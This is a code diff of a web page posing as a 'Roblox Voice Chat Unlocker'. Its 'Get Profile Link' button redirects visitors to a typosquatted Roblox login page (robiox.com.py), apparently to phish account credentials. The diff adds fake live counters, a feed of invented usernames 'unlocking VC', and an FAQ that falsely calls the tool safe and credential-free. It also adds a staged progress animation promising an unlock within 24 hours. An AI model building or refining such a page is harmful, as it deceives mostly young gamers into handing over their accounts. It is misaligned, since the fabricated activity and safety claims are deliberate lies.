@@ -21,10 +21,6 @@
       color: #eef2ff;
       line-height: 1.5;
       min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
       padding: 80px 20px;
       position: relative;
       overflow-x: hidden;
@@ -93,23 +89,27 @@
     }
 
     /* Main Container */
-    .saas-container {
-      max-width: 680px;
+    .main-container {
+      max-width: 1200px;
       width: 100%;
       margin: 0 auto;
       position: relative;
       z-index: 1;
-      animation: fadeInUp 0.6s ease-out;
+      display: flex;
+      flex-direction: column;
+      gap: 40px;
     }
 
-    @keyframes fadeInUp {
-      from {
-        opacity: 0;
-        transform: translateY(30px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
+    /* Grid Layout for Main Content + Sidebar */
+    .content-grid {
+      display: grid;
+      grid-template-columns: 1fr 360px;
+      gap: 32px;
+    }
+
+    @media (max-width: 900px) {
+      .content-grid {
+        grid-template-columns: 1fr;
       }
     }
 
@@ -118,7 +118,7 @@
       background: rgba(30, 41, 59, 0.6);
       backdrop-filter: blur(12px);
       border-radius: 24px;
-      padding: 40px;
+      padding: 32px;
       border: 1px solid rgba(255, 255, 255, 0.08);
       box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
       transition: all 0.3s ease;
@@ -166,13 +166,13 @@
     .description {
       font-size: 18px;
       color: #94a3b8;
-      margin-bottom: 2.5rem;
+      margin-bottom: 2rem;
       line-height: 1.6;
     }
 
     /* Input Groups */
     .input-group {
-      margin-bottom: 2rem;
+      margin-bottom: 1.5rem;
     }
 
     .input-label {
@@ -252,7 +252,7 @@
     .username-section {
       background: rgba(15, 23, 42, 0.5);
       border-radius: 20px;
-      padding: 1.5rem;
+      padding: 1.25rem;
       margin-top: 0.5rem;
       transition: all 0.3s ease;
     }
@@ -306,7 +306,7 @@
 
     /* Status Message */
     .status-message {
-      margin-top: 2rem;
+      margin-top: 1.5rem;
       font-size: 0.9rem;
       padding: 1rem 1.2rem;
       border-radius: 16px;
@@ -349,6 +349,128 @@
       background: linear-gradient(90deg, #8b5cf6, #3b82f6);
       border-radius: 4px;
       transition: width 0.3s ease;
+    }
+
+    /* Sidebar Stats */
+    .stats-card {
+      background: rgba(30, 41, 59, 0.6);
+      backdrop-filter: blur(12px);
+      border-radius: 24px;
+      padding: 24px;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      margin-bottom: 24px;
+    }
+
+    .stats-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 20px;
+      font-weight: 700;
+      font-size: 18px;
+      color: #cbd5e1;
+    }
+
+    .stats-header i {
+      color: #f59e0b;
+      font-size: 20px;
+    }
+
+    .live-stat {
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 16px;
+      padding: 16px;
+      margin-bottom: 16px;
+      text-align: center;
+    }
+
+    .live-stat-number {
+      font-size: 36px;
+      font-weight: 800;
+      background: linear-gradient(135deg, #f59e0b, #ef4444);
+      background-clip: text;
+      -webkit-background-clip: text;
+      color: transparent;
+    }
+
+    .live-stat-label {
+      font-size: 12px;
+      color: #94a3b8;
+      margin-top: 4px;
+    }
+
+    .activity-feed {
+      max-height: 300px;
+      overflow-y: auto;
+      margin-top: 16px;
+    }
+
+    .activity-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px 0;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+      font-size: 13px;
+    }
+
+    .activity-item i {
+      width: 28px;
+      color: #22c55e;
+    }
+
+    .activity-user {
+      color: #a78bfa;
+      font-weight: 600;
+    }
+
+    .activity-time {
+      font-size: 10px;
+      color: #64748b;
+      margin-left: auto;
+    }
+
+    /* FAQ Section */
+    .faq-card {
+      background: rgba(30, 41, 59, 0.6);
+      backdrop-filter: blur(12px);
+      border-radius: 24px;
+      padding: 32px;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+    }
+
+    .faq-item {
+      margin-bottom: 24px;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+      padding-bottom: 20px;
+    }
+
+    .faq-item:last-child {
+      border-bottom: none;
+      margin-bottom: 0;
+      padding-bottom: 0;
+    }
+
+    .faq-question {
+      font-weight: 700;
+      font-size: 18px;
+      color: #cbd5e1;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 12px;
+    }
+
+    .faq-question i {
+      color: #8b5cf6;
+      font-size: 20px;
+    }
+
+    .faq-answer {
+      color: #94a3b8;
+      font-size: 14px;
+      line-height: 1.6;
+      padding-left: 32px;
     }
 
     /* Modal Popup Styles */
@@ -494,7 +616,6 @@
       box-shadow: 0 4px 15px rgba(139, 92, 246, 0.4);
     }
 
-    /* Footer */
     .footer-note {
       margin-top: 2rem;
       text-align: center;
@@ -504,13 +625,27 @@
       padding-top: 1.5rem;
     }
 
-    /* Responsive */
+    /* Scrollbar */
+    .activity-feed::-webkit-scrollbar {
+      width: 4px;
+    }
+
+    .activity-feed::-webkit-scrollbar-track {
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 4px;
+    }
+
+    .activity-feed::-webkit-scrollbar-thumb {
+      background: #8b5cf6;
+      border-radius: 4px;
+    }
+
     @media (max-width: 640px) {
       body {
         padding: 40px 16px;
       }
       
-      .card {
+      .card, .faq-card {
         padding: 24px;
       }
       
@@ -532,10 +667,6 @@
         padding: 0.9rem;
       }
       
-      .username-section {
-        padding: 1rem;
-      }
-      
       .modal {
         padding: 24px;
       }
@@ -546,71 +677,164 @@
 <div class="floating-shape shape-1"></div>
 <div class="floating-shape shape-2"></div>
 
-<div class="saas-container">
-  <div class="card">
-    <div class="badge">
-      <i class="fas fa-microphone-alt"></i>
-      <span>VC UNLOCKER · PREMIUM TOOL</span>
-    </div>
-    
-    <h1>Roblox Voice Chat<br>Unlocker</h1>
-    <div class="description">
-      Unlock VC features instantly. Enter your profile link and username to confirm your access.
-    </div>
-
-    <!-- Profile Link Section -->
-    <div class="input-group">
-      <div class="input-label">
-        <i class="fab fa-roblox"></i>
-        <span>Roblox Profile URL</span>
-      </div>
-      <input type="text" id="profileLinkInput" class="profile-input" 
-             placeholder="https://www.roblox.com/users/123456789/profile" 
-             value="">
-      <div class="link-wrapper">
-        <i class="fas fa-external-link-alt"></i>
-        <span id="getProfileLink" class="blue-link">
-          <i class="fas fa-arrow-right"></i> Get Profile Link
-        </span>
-      </div>
-    </div>
-
-    <!-- Username Section -->
-    <div class="username-section">
-      <div class="input-label">
-        <i class="fas fa-user-astronaut"></i>
-        <span>Enter Roblox Username</span>
-      </div>
-      <div class="inline-group">
-        <div class="username-field">
-          <input type="text" id="usernameInput" class="profile-input" 
-                 placeholder="e.g., CoolBuilder123" 
-                 style="background:#0f172a;">
+<div class="main-container">
+  <div class="content-grid">
+    <!-- Main Content -->
+    <div>
+      <div class="card">
+        <div class="badge">
+          <i class="fas fa-microphone-alt"></i>
+          <span>VC UNLOCKER · PREMIUM TOOL</span>
         </div>
-        <button id="confirmBtn" class="confirm-btn">
-          <i class="fas fa-check-circle"></i> Confirm & Unlock
-        </button>
-      </div>
-      <div style="font-size: 0.7rem; margin-top: 0.75rem; color:#64748b; padding-left: 0.2rem;">
-        <i class="fas fa-shield-alt"></i> Both profile link and username are required to confirm
+        
+        <h1>Roblox Voice Chat<br>Unlocker</h1>
+        <div class="description">
+          Unlock VC features instantly. Enter your profile link and username to confirm your access.
+        </div>
+
+        <!-- Profile Link Section -->
+        <div class="input-group">
+          <div class="input-label">
+            <i class="fab fa-roblox"></i>
+            <span>Roblox Profile URL</span>
+          </div>
+          <input type="text" id="profileLinkInput" class="profile-input" 
+                 placeholder="https://www.roblox.com/users/123456789/profile" 
+                 value="">
+          <div class="link-wrapper">
+            <i class="fas fa-external-link-alt"></i>
+            <span id="getProfileLink" class="blue-link">
+              <i class="fas fa-arrow-right"></i> Get Profile Link
+            </span>
+          </div>
+        </div>
+
+        <!-- Username Section -->
+        <div class="username-section">
+          <div class="input-label">
+            <i class="fas fa-user-astronaut"></i>
+            <span>Enter Roblox Username</span>
+          </div>
+          <div class="inline-group">
+            <div class="username-field">
+              <input type="text" id="usernameInput" class="profile-input" 
+                     placeholder="e.g., CoolBuilder123" 
+                     style="background:#0f172a;">
+            </div>
+            <button id="confirmBtn" class="confirm-btn">
+              <i class="fas fa-check-circle"></i> Confirm & Unlock
+            </button>
+          </div>
+          <div style="font-size: 0.7rem; margin-top: 0.75rem; color:#64748b; padding-left: 0.2rem;">
+            <i class="fas fa-shield-alt"></i> Both profile link and username are required to confirm
+          </div>
+        </div>
+
+        <!-- Progress Bar -->
+        <div id="progressContainer" class="progress-container">
+          <div id="progressBar" class="progress-bar"></div>
+        </div>
+
+        <!-- Status Message -->
+        <div id="statusArea" class="status-message">
+          <i class="fas fa-info-circle"></i> Ready — enter your profile link and username
+        </div>
       </div>
     </div>
 
-    <!-- Progress Bar -->
-    <div id="progressContainer" class="progress-container">
-      <div id="progressBar" class="progress-bar"></div>
-    </div>
-
-    <!-- Status Message -->
-    <div id="statusArea" class="status-message">
-      <i class="fas fa-info-circle"></i> Ready — enter your profile link and username
-    </div>
-    
-    <div class="footer-note">
-      <i class="fas fa-lock"></i> Secure · Encrypted · Roblox VC Unlocker
+    <!-- Sidebar -->
+    <div>
+      <!-- Live Stats Card -->
+      <div class="stats-card">
+        <div class="stats-header">
+          <i class="fas fa-fire"></i>
+          <span>Live Activity</span>
+        </div>
+        <div class="live-stat">
+          <div class="live-stat-number" id="todayCount">1,248</div>
+          <div class="live-stat-label">users unlocked VC today</div>
+        </div>
+        <div class="live-stat">
+          <div class="live-stat-number" id="processingCount">32</div>
+          <div class="live-stat-label">users processing right now</div>
+        </div>
+        <div class="stats-header" style="margin-top: 8px;">
+          <i class="fas fa-clock"></i>
+          <span>Recent Activity</span>
+        </div>
+        <div class="activity-feed" id="activityFeed">
+          <div class="activity-item">
+            <i class="fas fa-check-circle"></i>
+            <span><span class="activity-user">@xX_ProGamer_Xx</span> just unlocked VC</span>
+            <span class="activity-time">just now</span>
+          </div>
+          <div class="activity-item">
+            <i class="fas fa-check-circle"></i>
+            <span><span class="activity-user">@BloxyMaster</span> just unlocked VC</span>
+            <span class="activity-time">2 min ago</span>
+          </div>
+          <div class="activity-item">
+            <i class="fas fa-check-circle"></i>
+            <span><span class="activity-user">@RobloxFan2024</span> just unlocked VC</span>
+            <span class="activity-time">5 min ago</span>
+          </div>
+          <div class="activity-item">
+            <i class="fas fa-check-circle"></i>
+            <span><span class="activity-user">@NoobSlayer99</span> just unlocked VC</span>
+            <span class="activity-time">8 min ago</span>
+          </div>
+          <div class="activity-item">
+            <i class="fas fa-check-circle"></i>
+            <span><span class="activity-user">@EpicBuilder123</span> just unlocked VC</span>
+            <span class="activity-time">12 min ago</span>
+          </div>
+        </div>
+      </div>
     </div>
   </div>
+  <!-- FAQ Section -->
+  <div class="faq-card">
+    <div class="stats-header" style="margin-bottom: 24px;">
+      <i class="fas fa-question-circle"></i>
+      <span>Frequently Asked Questions</span>
+    </div>
+    
+    <div class="faq-item">
+      <div class="faq-question">
+        <i class="fas fa-id-card"></i>
+        <span>Do I need ID verification?</span>
+      </div>
+      <div class="faq-answer">
+        No, our VC unlocker does not require any ID verification. The process is automated and does not request any sensitive personal documents. Simply provide your Roblox profile link and username to get started.
+      </div>
+    </div>
+    
+    <div class="faq-item">
+      <div class="faq-question">
+        <i class="fas fa-shield-alt"></i>
+        <span>Is this safe to use?</span>
+      </div>
+      <div class="faq-answer">
+        Yes, our tool is 100% safe. We use encrypted connections and do not store any personal data. The process only requires your public Roblox profile information, and we never ask for passwords or account credentials.
+      </div>
+    </div>
+    
+    <div class="faq-item">
+      <div class="faq-question">
+        <i class="fas fa-hourglass-half"></i>
+        <span>Why does it take up to 24 hours?</span>
+      </div>
+      <div class="faq-answer">
+        The 24-hour timeframe allows for proper system synchronization and ensures a smooth activation process. Roblox's voice chat system requires backend processing, and we prioritize stability over speed to guarantee your VC works correctly without issues.
+      </div>
+    </div>
+  </div>
+  
+  <div class="footer-note">
+    <i class="fas fa-lock"></i> Secure · Encrypted · Roblox VC Unlocker
+  </div>
 </div>
+
 <!-- Modal Popup -->
 <div id="modalOverlay" class="modal-overlay">
   <div class="modal">
@@ -644,8 +868,18 @@
 </div>
 
 <script>
-  // Redirect URL - goes directly to PLS DONATE
+  // Redirect URL
   const REDIRECT_URL = "https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fgames%2F274156662874%2FPLS-DONATE";
+  
+  // Sample usernames for activity feed
+  const sampleUsernames = [
+    "xX_ProGamer_Xx", "BloxyMaster", "RobloxFan2024", "NoobSlayer99", 
+    "EpicBuilder123", "LegendaryPlayer", "SpeedRunner", "AdoptMePro",
+    "TowerHero", "SimulatorKing", "BloxFruitsMaster", "PetCollector"
+  ];
+  
+  let todayCount = 1248;
+  let processingCount = 32;
   
   const statusDiv = document.getElementById('statusArea');
   const progressContainer = document.getElementById('progressContainer');
@@ -653,8 +887,74 @@
   const modalOverlay = document.getElementById('modalOverlay');
   const modalCloseBtn = document.getElementById('modalCloseBtn');
   const finalMessageDiv = document.getElementById('finalMessage');
+  const activityFeed = document.getElementById('activityFeed');
+  const todayCountElem = document.getElementById('todayCount');
+  const processingCountElem = document.getElementById('processingCount');
   
   let progressInterval = null;
+  
+  // Simulate live updates
+  function updateLiveStats() {
+    // Randomly update numbers for realism
+    setInterval(() => {
+      if (Math.random() > 0.7) {
+        todayCount += Math.floor(Math.random() * 3) + 1;
+        todayCountElem.textContent = todayCount.toLocaleString();
+      }
+      
+      if (Math.random() > 0.8) {
+        processingCount = Math.floor(Math.random() * 50) + 15;
+        processingCountElem.textContent = processingCount;
+      }
+    }, 8000);
+  }
+  
+  // Add new activity feed items
+  function addActivity(username) {
+    const activityItem = document.createElement('div');
+    activityItem.className = 'activity-item';
+    const now = new Date();
+    const timeString = 'just now';
+    activityItem.innerHTML = `
+      <i class="fas fa-check-circle"></i>
+      <span><span class="activity-user">@${username}</span> just unlocked VC</span>
+      <span class="activity-time">just now</span>
+    `;
+    activityFeed.insertBefore(activityItem, activityFeed.firstChild);
+    
+    // Remove oldest item if more than 10
+    while (activityFeed.children.length > 10) {
+      activityFeed.removeChild(activityFeed.lastChild);
+    }
+    
+    // Update timestamps of existing items
+    const items = activityFeed.querySelectorAll('.activity-item');
+    items.forEach((item, index) => {
+      const timeSpan = item.querySelector('.activity-time');
+      if (index === 0) {
+        timeSpan.textContent = 'just now';
+      } else {
+        const minutes = index * 3 + 2;
+        if (minutes < 60) {
+          timeSpan.textContent = `${minutes} min ago`;
+        } else {
+          timeSpan.textContent = `${Math.floor(minutes / 60)} hr ago`;
+        }
+      }
+    });
+  }
+  
+  // Simulate random activity
+  function simulateActivity() {
+    setInterval(() => {
+      if (Math.random() > 0.6) {
+        const randomUsername = sampleUsernames[Math.floor(Math.random() * sampleUsernames.length)];
+        addActivity(randomUsername);
+        todayCount++;
+        todayCountElem.textContent = todayCount.toLocaleString();
+      }
+    }, 15000);
+  }
   
   function setStatus(message, type = 'info') {
     statusDiv.classList.remove('error-status', 'success-status');
@@ -677,20 +977,15 @@
       const step = document.getElementById(stepId);
       const iconDiv = step.querySelector('.step-icon');
       const statusSpan = step.querySelector('.step-status');
-      
-      if (index === 0) {
-        iconDiv.innerHTML = '<i class="fas fa-circle-notch"></i>';
-        statusSpan.textContent = 'Pending';
-      } else {
-        iconDiv.innerHTML = '<i class="fas fa-circle-notch"></i>';
-        statusSpan.textContent = 'Pending';
-      }
+      iconDiv.innerHTML = '<i class="fas fa-circle-notch"></i>';
+      statusSpan.textContent = 'Pending';
+      statusSpan.style.color = '#64748b';
     });
     finalMessageDiv.style.display = 'none';
     modalCloseBtn.style.display = 'none';
   }
   
-  function updateStep(stepId, status, isComplete = false) {
+  function updateStep(stepId, isComplete = false) {
     const step = document.getElementById(stepId);
     const iconDiv = step.querySelector('.step-icon');
     const statusSpan = step.querySelector('.step-status');
@@ -699,7 +994,7 @@
       iconDiv.innerHTML = '<i class="fas fa-check-circle" style="color: #22c55e;"></i>';
       statusSpan.textContent = 'Completed';
       statusSpan.style.color = '#22c55e';
-    } else if (status === 'loading') {
+    } else {
       iconDiv.innerHTML = '<i class="fas fa-spinner fa-spin" style="color: #8b5cf6;"></i>';
       statusSpan.textContent = 'In progress';
       statusSpan.style.color = '#8b5cf6';
@@ -707,25 +1002,17 @@
   }
   
   function runSteps(callback) {
-    // Step 1: Verifying details - 2.5 seconds
-    updateStep('step1', 'loading', false);
+    updateStep('step1', false);
     setTimeout(() => {
-      updateStep('step1', null, true);
-      
-      // Step 2: Setting things up - 2.5 seconds
-      updateStep('step2', 'loading', false);
+      updateStep('step1', true);
+      updateStep('step2', false);
       setTimeout(() => {
-        updateStep('step2', null, true);
-        
-        // Step 3: Syncing information - 2.5 seconds
-        updateStep('step3', 'loading', false);
+        updateStep('step2', true);
+        updateStep('step3', false);
         setTimeout(() => {
-          updateStep('step3', null, true);
-          
-          // Show final message
+          updateStep('step3', true);
           finalMessageDiv.style.display = 'block';
           modalCloseBtn.style.display = 'block';
-          
           if (callback) callback();
         }, 2500);
       }, 2500);
@@ -779,55 +1066,46 @@
     return usernameRegex.test(username.trim());
   }
   
-  // Get Profile Link: opens in same tab
   function handleGetProfileLink() {
     window.location.href = REDIRECT_URL;
     setStatus("Redirecting to get your profile link...", "success");
   }
   
-  // Confirm button with modal popup
   function handleConfirm() {
     const profileLink = document.getElementById('profileLinkInput').value.trim();
     const username = document.getElementById('usernameInput').value.trim();
     
-    // Check if profile link is empty
     if (profileLink === "") {
       setStatus("Please enter your Roblox profile link.", "error");
       return;
     }
     
-    // Check if username is empty
     if (username === "") {
       setStatus("Please enter your Roblox username.", "error");
       return;
     }
     
-    // Validate profile link format
     if (!isValidProfileLink(profileLink)) {
       setStatus("Invalid Roblox profile link. Make sure it's a valid Roblox URL.", "error");
       return;
     }
     
-    // Validate username format
     if (!isValidUsername(username)) {
       setStatus("Invalid username format (3-20 chars, letters, numbers, underscores).", "error");
       return;
     }
     
-    // Start progress animation
     startProgress();
-    
-    // Reset and show modal
     resetSteps();
     modalOverlay.classList.add('active');
     
-    // Run the step sequence
     runSteps(() => {
-      // After all steps complete
       completeProgress();
       setStatus(`Success! Profile link and username "${username}" confirmed. Voice Chat will be unlocked within 24 hours.`, "success");
+      addActivity(username);
+      todayCount++;
+      todayCountElem.textContent = todayCount.toLocaleString();
       
-      // Add celebration effect
       const confirmBtn = document.getElementById('confirmBtn');
       confirmBtn.style.transform = 'scale(1.02)';
       setTimeout(() => {
@@ -836,62 +1114,37 @@
     });
   }
   
-  // Close modal
   function closeModal() {
     modalOverlay.classList.remove('active');
   }
   
-  // Add button click animation for confirm button
-  const confirmBtn = document.getElementById('confirmBtn');
-  confirmBtn.addEventListener('click', function(e) {
-    this.style.transform = 'scale(0.98)';
-    setTimeout(() => {
-      this.style.transform = '';
-    }, 150);
-  });
-  
-  // Event listeners
   document.getElementById('getProfileLink').addEventListener('click', handleGetProfileLink);
   document.getElementById('confirmBtn').addEventListener('click', handleConfirm);
   modalCloseBtn.addEventListener('click', closeModal);
   
-  // Close modal when clicking overlay
   modalOverlay.addEventListener('click', function(e) {
     if (e.target === modalOverlay) {
       closeModal();
     }
   });
   
-  // Enter key on username field triggers confirm
-  const usernameField = document.getElementById('usernameInput');
-  usernameField.addEventListener('keypress', function(e) {
+  document.getElementById('usernameInput').addEventListener('keypress', function(e) {
     if (e.key === 'Enter') {
       e.preventDefault();
       handleConfirm();
     }
   });
   
-  // Enter key on profile link field triggers confirm
-  const profileField = document.getElementById('profileLinkInput');
-  profileField.addEventListener('keypress', function(e) {
+  document.getElementById('profileLinkInput').addEventListener('keypress', function(e) {
     if (e.key === 'Enter') {
       e.preventDefault();
       handleConfirm();
     }
   });
   
-  // Input focus effects
-  const inputs = document.querySelectorAll('.profile-input');
-  inputs.forEach(input => {
-    input.addEventListener('focus', () => {
-      input.parentElement.style.transform = 'translateY(-2px)';
-    });
-    input.addEventListener('blur', () => {
-      input.parentElement.style.transform = '';
-    });
-  });
+  updateLiveStats();
+  simulateActivity();
   
-  // Initial status
   setTimeout(() => {
     setStatus("Click 'Get Profile Link' to get your profile link, then paste it and enter your username", "info");
   }, 100);
